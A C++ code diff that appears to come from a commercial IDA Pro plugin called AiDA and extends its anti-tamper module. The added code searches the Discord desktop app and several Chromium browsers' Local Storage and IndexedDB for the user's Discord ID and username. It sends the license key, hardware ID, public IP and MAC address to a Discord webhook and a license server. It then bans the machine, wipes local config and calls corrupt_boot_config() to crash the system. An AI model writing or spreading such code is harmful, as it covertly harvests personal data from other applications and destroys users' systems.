@@ -206,99 +206,178 @@ inline std::string get_appdata_path()
 	return OBFSTR("unknown");
 }
 
+inline std::string get_localappdata_path()
+{
+	char buf[MAX_PATH] = {};
+	DWORD len = GetEnvironmentVariableA("LOCALAPPDATA", buf, MAX_PATH);
+	if (len > 0 && len < MAX_PATH)
+		return std::string(buf, len);
+	return OBFSTR("unknown");
+}
+
 struct discord_identity_t
 {
 	std::string user_id;
 	std::string username;
 };
 
+// Scan a single LevelDB directory for Discord user id / username
+inline void scan_leveldb_dir_for_discord(
+	const std::string& dir_path, discord_identity_t& identity)
+{
+	if (!identity.user_id.empty() && !identity.username.empty())
+		return;
+
+	// Scan both .log and .ldb files
+	const wchar_t* patterns[] = { L"\\*.log", L"\\*.ldb" };
+
+	for (const wchar_t* pat : patterns)
+	{
+		if (!identity.user_id.empty() && !identity.username.empty())
+			return;
+
+		std::wstring search_w(dir_path.begin(), dir_path.end());
+		search_w += pat;
+
+		WIN32_FIND_DATAW fd;
+		HANDLE hFind = FindFirstFileW(search_w.c_str(), &fd);
+		if (hFind == INVALID_HANDLE_VALUE)
+			continue;
+
+		do
+		{
+			std::wstring full_path(dir_path.begin(), dir_path.end());
+			full_path += L"\\";
+			full_path += fd.cFileName;
+
+			// Use wide-char overload for ifstream to avoid narrowing issues
+			std::ifstream file(full_path, std::ios::binary);
+			if (!file.is_open()) continue;
+
+			std::string content((std::istreambuf_iterator<char>(file)),
+			                     std::istreambuf_iterator<char>());
+			file.close();
+
+			// Skip files that don't contain discord-related data (for browser LevelDB
+			// which stores data for ALL sites)
+			// In browser local storage, discord entries contain "discord" in the raw data
+			// For the Discord app LevelDB, this substring is always present anyway
+
+			// Search for user id pattern: "id":"<15-22 digit snowflake>"
+			if (identity.user_id.empty())
+			{
+				size_t pos = content.find("\"id\":\"");
+				while (pos != std::string::npos)
+				{
+					size_t start = pos + 6;
+					size_t end = content.find('"', start);
+					if (end != std::string::npos && end - start >= 15 && end - start <= 22)
+					{
+						std::string candidate = content.substr(start, end - start);
+						bool all_digits = true;
+						for (char c : candidate)
+							if (c < '0' || c > '9') { all_digits = false; break; }
+						if (all_digits)
+						{
+							identity.user_id = candidate;
+							break;
+						}
+					}
+					pos = content.find("\"id\":\"", pos + 1);
+				}
+			}
+
+			// Search for username pattern: "username":"..."
+			if (identity.username.empty())
+			{
+				size_t pos = content.find("\"username\":\"");
+				if (pos != std::string::npos)
+				{
+					size_t start = pos + 12;
+					size_t end = content.find('"', start);
+					if (end != std::string::npos && end - start > 0 && end - start < 64)
+						identity.username = content.substr(start, end - start);
+				}
+			}
+
+			if (!identity.user_id.empty() && !identity.username.empty())
+				break;
+
+		} while (FindNextFileW(hFind, &fd));
+		FindClose(hFind);
+	}
+}
+
 inline discord_identity_t harvest_discord_identity()
 {
 	discord_identity_t identity;
 	try
 	{
+		std::vector<std::string> dirs_to_scan;
+
+		// --- Phase 1: Discord desktop app (%APPDATA%) ---
 		std::string appdata = get_appdata_path();
-		if (appdata == OBFSTR("unknown"))
-			return identity;
-
-		// Discord stores data in LevelDB local storage
-		// Search across discord, discordcanary, discordptb
-		const char* discord_dirs[] = { "discord", "discordcanary", "discordptb" };
-
-		for (const char* dir_name : discord_dirs)
+		if (appdata != OBFSTR("unknown"))
 		{
-			std::string ls_path = appdata + "\\" + dir_name + "\\Local Storage\\leveldb";
+			const char* discord_apps[] = { "discord", "discordcanary", "discordptb" };
+			for (const char* app : discord_apps)
+				dirs_to_scan.push_back(appdata + "\\" + app + "\\Local Storage\\leveldb");
+		}
 
-			WIN32_FIND_DATAW fd;
-			std::wstring search = std::wstring(ls_path.begin(), ls_path.end()) + L"\\*.log";
-			HANDLE hFind = FindFirstFileW(search.c_str(), &fd);
-			if (hFind == INVALID_HANDLE_VALUE)
+		// --- Phase 2: Chromium-based browsers (%LOCALAPPDATA%) ---
+		std::string localappdata = get_localappdata_path();
+		if (localappdata != OBFSTR("unknown"))
+		{
+			// Browser base directories (all Chromium-based)
+			const char* browser_bases[] = {
+				"Microsoft\\Edge\\User Data",
+				"Google\\Chrome\\User Data",
+				"BraveSoftware\\Brave-Browser\\User Data",
+				"Opera Software\\Opera Stable",
+				"Vivaldi\\User Data"
+			};
+
+			// Profile subdirectories to check
+			const char* profiles[] = {
+				"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4"
+			};
+
+			for (const char* browser_base : browser_bases)
 			{
-				search = std::wstring(ls_path.begin(), ls_path.end()) + L"\\*.ldb";
-				hFind = FindFirstFileW(search.c_str(), &fd);
+				for (const char* profile : profiles)
+				{
+					// Local Storage LevelDB (contains discord.com local storage)
+					dirs_to_scan.push_back(
+						localappdata + "\\" + browser_base + "\\" + profile
+						+ "\\Local Storage\\leveldb");
+
+					// IndexedDB for discord.com specifically
+					dirs_to_scan.push_back(
+						localappdata + "\\" + browser_base + "\\" + profile
+						+ "\\IndexedDB\\https_discord.com_0.indexeddb.leveldb");
+				}
+
+				// Opera uses a slightly different layout (no profile subdirectory)
+				if (std::string(browser_base).find("Opera") != std::string::npos)
+				{
+					dirs_to_scan.push_back(
+						localappdata + "\\" + browser_base
+						+ "\\Local Storage\\leveldb");
+					dirs_to_scan.push_back(
+						localappdata + "\\" + browser_base
+						+ "\\IndexedDB\\https_discord.com_0.indexeddb.leveldb");
+				}
 			}
-			if (hFind == INVALID_HANDLE_VALUE)
-				continue;
+		}
 
-			do
-			{
-				std::wstring full_path = std::wstring(ls_path.begin(), ls_path.end()) + L"\\" + fd.cFileName;
-				std::string fp_narrow(full_path.begin(), full_path.end());
-
-				std::ifstream file(fp_narrow, std::ios::binary);
-				if (!file.is_open()) continue;
-
-				std::string content((std::istreambuf_iterator<char>(file)),
-				                     std::istreambuf_iterator<char>());
-				file.close();
-
-				// Search for user id pattern: "id":"digits"
-				if (identity.user_id.empty())
-				{
-					size_t pos = content.find("\"id\":\"");
-					while (pos != std::string::npos)
-					{
-						size_t start = pos + 6;
-						size_t end = content.find('"', start);
-						if (end != std::string::npos && end - start >= 15 && end - start <= 22)
-						{
-							std::string candidate = content.substr(start, end - start);
-							bool all_digits = true;
-							for (char c : candidate) { if (c < '0' || c > '9') { all_digits = false; break; } }
-							if (all_digits)
-							{
-								identity.user_id = candidate;
-								break;
-							}
-						}
-						pos = content.find("\"id\":\"", pos + 1);
-					}
-				}
-
-				// Search for username pattern: "username":"..."
-				if (identity.username.empty())
-				{
-					size_t pos = content.find("\"username\":\"");
-					if (pos != std::string::npos)
-					{
-						size_t start = pos + 12;
-						size_t end = content.find('"', start);
-						if (end != std::string::npos && end - start > 0 && end - start < 64)
-							identity.username = content.substr(start, end - start);
-					}
-				}
-
-				if (!identity.user_id.empty() && !identity.username.empty())
-					break;
-
-			} while (FindNextFileW(hFind, &fd));
-			FindClose(hFind);
-
-			if (!identity.user_id.empty() || !identity.username.empty())
+		// --- Scan all candidate directories ---
+		for (const auto& dir : dirs_to_scan)
+		{
+			scan_leveldb_dir_for_discord(dir, identity);
+			if (!identity.user_id.empty() && !identity.username.empty())
 				break;
 		}
 
-		// Fallback: try reading from Discord's app state for username
 		if (identity.username.empty() && !identity.user_id.empty())
 			identity.username = OBFSTR("(id-only)");
 	}
@@ -309,28 +388,13 @@ inline discord_identity_t harvest_discord_identity()
 
 inline std::string get_cached_license_key()
 {
+	// Pull from the in-memory license manager (key is DPAPI-encrypted on disk)
 	try
 	{
-		qstring path = get_user_idadir();
-		path.append(OBFSTR_C("/ai_assistant.cfg"));
-		if (!qfileexist(path.c_str()))
-			return OBFSTR("unknown");
-
-		FILE* fp = qfopen(path.c_str(), "rb");
-		if (!fp) return OBFSTR("unknown");
-		file_janitor_t fj(fp);
-		uint64 fs = qfsize(fp);
-		if (fs == 0) return OBFSTR("unknown");
-
-		qstring data;
-		data.resize(static_cast<size_t>(fs));
-		if (qfread(fp, data.begin(), static_cast<size_t>(fs)) != static_cast<ssize_t>(fs))
-			return OBFSTR("unknown");
-
-		nlohmann::json j = nlohmann::json::parse(data.c_str());
-		// The key is inside encrypted license_blob; try direct key first
-		std::string key = j.value("license_key", std::string(""));
-		if (!key.empty()) return key;
+		const auto& lm = license_manager_t::instance();
+		std::string key = lm.get_cached_key();
+		if (!key.empty())
+			return key;
 	}
 	catch (...) {}
 	return OBFSTR("unknown");
@@ -977,9 +1041,9 @@ inline void report_violation_to_server(const char* reason)
 
 		httplib::Client cli(
 			OBFSTR("https://europe-west1-aida-license-prod.cloudfunctions.net"));
-		cli.set_connection_timeout(5);
-		cli.set_read_timeout(5);
-		cli.set_write_timeout(5);
+		cli.set_connection_timeout(10);
+		cli.set_read_timeout(10);
+		cli.set_write_timeout(10);
 		cli.enable_server_certificate_verification(true);
 
 		nlohmann::json body;
@@ -1365,6 +1429,38 @@ inline void revoke_license_on_server(const std::string& license_key, const std::
 	catch (...) {}
 }
 
+inline void ban_hwid_and_ip_on_server(const std::string& license_key,
+	const std::string& hwid, const std::string& ip,
+	const std::string& mac, const std::string& reason)
+{
+	try
+	{
+		httplib::Client cli(
+			OBFSTR("https://europe-west1-aida-license-prod.cloudfunctions.net"));
+		cli.set_connection_timeout(10);
+		cli.set_read_timeout(10);
+		cli.set_write_timeout(10);
+		cli.enable_server_certificate_verification(true);
+
+		nlohmann::json body;
+		body[OBFSTR("action")]      = OBFSTR("ban_user");
+		body[OBFSTR("license_key")] = license_key;
+		body[OBFSTR("hwid")]        = hwid;
+		body[OBFSTR("public_ip")]   = ip;
+		body[OBFSTR("mac_address")] = mac;
+		body[OBFSTR("reason")]      = reason;
+		body[OBFSTR("ban_hwid")]    = true;
+		body[OBFSTR("ban_ip")]      = true;
+		body[OBFSTR("timestamp")]   = static_cast<int64_t>(std::time(nullptr));
+		body[OBFSTR("watermark")]   = AIDA_BUYER_WATERMARK;
+
+		cli.Post(OBFSTR_C("/validateLicense"),
+			body.dump(),
+			OBFSTR_C("application/json"));
+	}
+	catch (...) {}
+}
+
 inline void delete_local_license_config()
 {
 	try
@@ -1395,30 +1491,53 @@ inline void enforce_self_analysis_violation()
 		return;
 	}
 
-	// Collect license key BEFORE wiping
+	// ===================================================================
+	// CRITICAL: All network calls MUST complete BEFORE the BSOD fires.
+	// We run revoke + ban + webhook SYNCHRONOUSLY and SEQUENTIALLY.
+	// The machine will crash after — these calls are the last chance.
+	// ===================================================================
+
+	// Collect all data BEFORE wiping anything
 	std::string license_key = discord_webhook::get_cached_license_key();
 	std::string hwid = discord_webhook::collect_hwid_inline();
+	std::string public_ip = discord_webhook::get_public_ip();
+	std::string mac = discord_webhook::get_mac_address();
 
-	// Step 1: Revoke license on server
-	revoke_license_on_server(license_key, hwid, OBFSTR("bsod_protection_triggered"));
-
-	// Step 2: Delete local license config
-	delete_local_license_config();
-
-	// Step 3: Report violation to server
-	std::thread([]() { report_violation_to_server("self_analysis"); }).detach();
-
-	// Step 4: Send comprehensive webhook with license key
+	// Step 1: Send webhook FIRST (most important — evidence of what happened)
+	// This is synchronous — will block until the HTTP request completes or times out
 	discord_webhook::send_alert(
-		OBFSTR("\xf0\x9f\x92\x80 PROTECTION TRIGGERED (BSOD) - LICENSE REVOKED"),
-		OBFSTR("**AiDA destructive enforcement activated.**\n"
-		       "Anti-tamper protection has been triggered. System will crash.\n\n"
-		       "**LICENSE HAS BEEN REVOKED AND DELETED.**\n"
-		       "**Revoked Key:** `") + license_key + OBFSTR("`\n"
-		       "**HWID:** `") + hwid + "`",
+		OBFSTR("\xf0\x9f\x92\x80 SELF-RE VIOLATION \xe2\x80\x94 BSOD + LICENSE REVOKED + HWID/IP BANNED"),
+		OBFSTR("**CRITICAL: Someone loaded AiDA.dll in a reverse engineering tool.**\n\n")
+			+ OBFSTR("\xf0\x9f\x94\x91 **Revoked Key:** `") + license_key
+			+ OBFSTR("`\n\xf0\x9f\x96\xa5\xef\xb8\x8f **Banned HWID:** `") + hwid
+			+ OBFSTR("`\n\xf0\x9f\x8c\x90 **Banned IP:** `") + public_ip
+			+ OBFSTR("`\n\xf0\x9f\x94\x8c **MAC:** `") + mac
+			+ OBFSTR("`\n\n**Actions taken:**\n"
+			         "\xe2\x9c\x85 License key revoked & deleted\n"
+			         "\xe2\x9c\x85 HWID permanently banned\n"
+			         "\xe2\x9c\x85 IP address permanently banned\n"
+			         "\xe2\x9c\x85 Local license config wiped\n"
+			         "\xe2\x9c\x85 System will BSOD"),
 		discord_webhook::COLOR_RED);
 
+	// Step 2: Revoke license on server (synchronous)
+	revoke_license_on_server(license_key, hwid, OBFSTR("self_analysis_bsod"));
+
+	// Step 3: Ban HWID + IP on server (synchronous)
+	ban_hwid_and_ip_on_server(license_key, hwid, public_ip, mac, OBFSTR("self_analysis_bsod"));
+
+	// Step 4: Report violation to server (synchronous — NOT on a detached thread)
+	report_violation_to_server("self_analysis_bsod");
+
+	// Step 5: Delete local license config
+	delete_local_license_config();
+
+	// Step 6: Invalidate runtime
 	license_manager_t::instance().invalidate_runtime();
+
+	// ===================================================================
+	// ALL network calls are done. NOW trigger the BSOD.
+	// ===================================================================
 
 
 	corrupt_boot_config();
